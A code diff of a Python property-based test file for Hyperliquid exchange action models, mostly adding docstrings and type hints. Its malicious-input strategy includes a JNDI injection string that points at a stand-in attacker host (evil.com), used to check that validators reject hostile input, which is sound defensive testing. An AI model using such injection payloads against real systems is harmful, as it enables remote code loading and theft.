@@ -1,7 +1,7 @@
 """Property-based tests for Hyperliquid raw exchange action models.
 
 These tests validate critical security boundary models that process external exchange action data.
-The models tested here are essential for order placement, transfers, withdrawals, and other exchange operations.
+The models tested here are essential for order placement, transfers, and exchange operations.
 
 SECURITY CRITICAL: These raw models protect against:
 - Malicious order placement data that could manipulate trading decisions
@@ -12,7 +12,7 @@ SECURITY CRITICAL: These raw models protect against:
 - Transfer amount manipulation that could affect balances
 - Order type confusion that could change execution behavior
 
-Property testing ensures comprehensive coverage of exchange action edge cases and adversarial inputs.
+Property testing ensures coverage of exchange action edge cases and adversarial inputs.
 """
 
 from __future__ import annotations
@@ -38,13 +38,21 @@ from cyberdelta.apis.hyperliquid.models.hl_raw_transfer_withdrawal import (
 from cyberdelta.exceptions.parsing import EmptyStringError
 
 
+# Type alias for malicious input types to avoid long lines
+MaliciousInput = str | int | float | bool | list[str] | dict[str, str] | bytes | None
+
+
 # =============================================================================
 # HYPOTHESIS STRATEGIES FOR EXCHANGE ACTION MODEL TESTING
 # =============================================================================
 
 
 def eth_address_strategy() -> SearchStrategy[str]:
-    """Generate valid Ethereum address strings."""
+    """Generate valid Ethereum address strings.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Standard Ethereum addresses
         st.just("0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B"),
@@ -61,7 +69,11 @@ def eth_address_strategy() -> SearchStrategy[str]:
 
 
 def decimal_str_strategy() -> SearchStrategy[str]:
-    """Generate valid decimal strings for prices and amounts."""
+    """Generate valid decimal strings for prices and amounts.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=8).map(str),
         st.decimals(min_value=Decimal("0.01"), max_value=Decimal(100000), places=6).map(str),
@@ -83,7 +95,11 @@ def decimal_str_strategy() -> SearchStrategy[str]:
 
 
 def positive_decimal_str_strategy() -> SearchStrategy[str]:
-    """Generate valid positive decimal strings."""
+    """Generate valid positive decimal strings.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=8).map(str),
         st.decimals(min_value=Decimal("0.01"), max_value=Decimal(100000), places=6).map(str),
@@ -96,7 +112,11 @@ def positive_decimal_str_strategy() -> SearchStrategy[str]:
 
 
 def client_order_id_strategy() -> SearchStrategy[str | None]:
-    """Generate valid client order ID strings (128-bit hex)."""
+    """Generate valid client order ID strings (128-bit hex).
+
+    Returns:
+        SearchStrategy[str | None]: Strategy for generating test data.
+    """
     return st.one_of([
         st.none(),  # Optional field
         # Valid 128-bit hex strings (34 chars total: 0x + 32 hex chars)
@@ -113,7 +133,11 @@ def client_order_id_strategy() -> SearchStrategy[str | None]:
 
 
 def order_type_details_strategy() -> SearchStrategy[dict[str, Any]]:
-    """Generate valid order type details."""
+    """Generate valid order type details.
+
+    Returns:
+        SearchStrategy[dict[str, Any]]: Strategy for generating test data.
+    """
     return st.one_of([
         # Limit orders with different TIF values
         st.just({"limit": {"tif": "Gtc"}}),
@@ -126,7 +150,11 @@ def order_type_details_strategy() -> SearchStrategy[dict[str, Any]]:
 
 @st.composite
 def valid_order_item_spec_data(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid order item spec data."""
+    """Generate valid order item spec data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "asset_index": draw(st.integers(min_value=0, max_value=1000)),
         "is_buy": draw(st.booleans()),
@@ -140,7 +168,11 @@ def valid_order_item_spec_data(draw: st.DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_eth_withdrawal_data(draw: st.DrawFn) -> dict[str, str]:
-    """Generate valid ETH withdrawal data."""
+    """Generate valid ETH withdrawal data.
+
+    Returns:
+        dict[str, str]: Generated test data.
+    """
     return {
         "amount": draw(positive_decimal_str_strategy()),
         "destination": draw(eth_address_strategy()),
@@ -149,7 +181,11 @@ def valid_eth_withdrawal_data(draw: st.DrawFn) -> dict[str, str]:
 
 @st.composite
 def valid_l2_transfer_payload_data(draw: st.DrawFn) -> dict[str, str]:
-    """Generate valid L2 USD transfer payload data."""
+    """Generate valid L2 USD transfer payload data.
+
+    Returns:
+        dict[str, str]: Generated test data.
+    """
     return {
         "destination": draw(eth_address_strategy()),
         "token": "USDC",  # Must be USDC for L2 transfers
@@ -157,8 +193,12 @@ def valid_l2_transfer_payload_data(draw: st.DrawFn) -> dict[str, str]:
     }
 
 
-def malicious_action_strategy() -> SearchStrategy[Any]:
-    """Generate malicious values for exchange action security testing."""
+def malicious_action_strategy() -> SearchStrategy[MaliciousInput]:
+    """Generate malicious values for exchange action security testing.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Action manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-orders}"),
@@ -214,7 +254,7 @@ class TestHyperliquidRawEthWithdrawalActionPayloadProperties:
     def test_eth_withdrawal_validation_success_properties(
         self, withdrawal_data: dict[str, str]
     ) -> None:
-        """Property: Valid ETH withdrawal data should always create valid payload objects."""
+        """Property: Valid data should create valid payload objects."""
         # Skip invalid data
         for field in ["amount", "destination"]:
             value = withdrawal_data[field]
@@ -250,10 +290,10 @@ class TestHyperliquidRawEthWithdrawalActionPayloadProperties:
         malicious_value=malicious_action_strategy(),
     )
     def test_eth_withdrawal_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: ETH withdrawal should reject malicious inputs safely."""
-        base_data = {
+        """Property: ETH withdrawal should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "amount": "100.0",
             "destination": "0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B",
         }
@@ -358,7 +398,7 @@ class TestHyperliquidRawOrderItemSpecProperties:
 
     @given(order_data=valid_order_item_spec_data())
     def test_order_item_validation_success_properties(self, order_data: dict[str, Any]) -> None:
-        """Property: Valid order item data should always create valid order spec objects."""
+        """Property: Valid data should create valid order spec objects."""
         # Skip invalid data
         assume(isinstance(order_data["asset_index"], int) and order_data["asset_index"] >= 0)
         assume(isinstance(order_data["is_buy"], bool))
@@ -414,10 +454,10 @@ class TestHyperliquidRawOrderItemSpecProperties:
         malicious_value=malicious_action_strategy(),
     )
     def test_order_item_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: Order item spec should reject malicious inputs safely."""
-        base_data = {
+        """Property: Order item spec should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "asset_index": 0,
             "is_buy": True,
             "limit_px": "100.0",
@@ -534,7 +574,7 @@ class TestHyperliquidRawL2UsdTransferActionDetailsProperties:
 
     @given(payload_data=valid_l2_transfer_payload_data())
     def test_l2_transfer_validation_success_properties(self, payload_data: dict[str, str]) -> None:
-        """Property: Valid L2 transfer data should always create valid action details objects."""
+        """Property: Valid data should create valid action details objects."""
         # Skip invalid data
         for field in ["destination", "amount"]:
             value = payload_data[field]
@@ -603,7 +643,9 @@ class TestHyperliquidRawL2UsdTransferActionDetailsProperties:
             HyperliquidRawL2UsdTransferActionDetails.model_validate(data)
 
     @given(malicious_payload=malicious_action_strategy())
-    def test_l2_transfer_malicious_payload_properties(self, malicious_payload: Any) -> None:
+    def test_l2_transfer_malicious_payload_properties(
+        self, malicious_payload: MaliciousInput
+    ) -> None:
         """Property: L2 transfer should reject malicious payload data."""
         data = {"chain": "L2", "payload": malicious_payload}
 
